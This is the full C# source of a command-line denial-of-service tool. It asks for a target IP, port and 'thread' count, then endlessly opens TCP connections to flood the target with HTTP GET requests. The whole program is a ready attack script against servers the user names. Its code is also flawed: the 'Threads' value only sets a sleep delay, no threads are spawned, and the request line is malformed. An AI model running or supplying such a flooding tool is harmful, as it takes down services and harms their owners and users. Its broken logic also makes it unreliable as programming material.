using System; 
using System.Net.Sockets; 
using System.Net; 
using System.Threading; 


class DDOS 
{ 
    public static void Main (){  
        var banner = @"
█▀▄ █▀▄ ▄▀▀▄ ▄▀▀
█░█ █░█ █░░█ ░▀▄
▀▀░ ▀▀░ ░▀▀░ ▀▀░  

by: vsdifficult
        ";  
        Console.ForegroundColor = ConsoleColor.Blue; 
        Console.WriteLine(banner); 

        Console.ForegroundColor = ConsoleColor.Cyan; 
        Console.Write("[~] Enter Target (IP) (#.#.#.#): "); 
        var ip = Console.ReadLine();

        Console.ForegroundColor = ConsoleColor.Green; 
        Console.Write("[~] Enter Port: "); 
        var port = Convert.ToInt32(Console.ReadLine());
        
        Console.ForegroundColor = ConsoleColor.Yellow; 
        Console.Write("[~] Enter Threads: "); 
        var thr = Convert.ToInt32(Console.ReadLine());

        string targetip = ip;   
        int targetport = port;  
        int Thread_ = thr;
         
        ddosfunc(ip, port, thr); 
        

    } 
    public static void ddosfunc(string ip, 
                         int port, 
                         int Threads) {
        while (true) {
              if (ip == null) { 
                Console.WriteLine("[!] You not write target"); 
              }  
              else { 
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);  
                socket.Connect(new IPEndPoint(IPAddress.Parse(ip), port)); 
                string requestData = "GET/HTTP/1.1\r\nHost:"+ip+"\r\n\r\n"; 
                byte [] buff = System.Text.Encoding.ASCII.GetBytes(requestData); 
                socket.Send(buff, 0, buff.Length, SocketFlags.None); 

                socket.Close();   
                Thread.Sleep(Threads); 
              }
        }
    }
         
} 